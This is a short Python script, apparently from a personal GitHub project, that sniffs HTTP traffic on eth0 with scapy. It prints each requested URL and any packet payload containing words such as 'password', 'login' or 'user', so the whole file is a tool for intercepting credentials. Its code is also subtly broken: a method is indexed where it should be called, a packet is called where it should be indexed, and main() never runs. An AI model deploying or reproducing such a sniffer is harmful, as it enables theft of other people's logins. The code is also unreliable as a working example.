'''                                         '''

    ########################################
    #         Http Password Sniffer        #
    #       Ahmad Reza Parsi Zadeh         #
    #        github: ahmad-reza-ut         #
    ########################################


'''                                         '''
#------------- HTTP Password Sniffer -------------#
# Importing necessary libraries
from Imports import *
words = ["password", "user", "username", "login", "pass", "User", "Password"]
# ---------------------------------- #
def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer[scapy.packet.Raw]:
            load = packet(scapy.Raw).load
            for word in words:
                if word in str(load):
                    print(load)
                    break
# ---------------------------------- #
def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_packets)
#------------------ Main ------------------#
def main():
    sniff("eth0")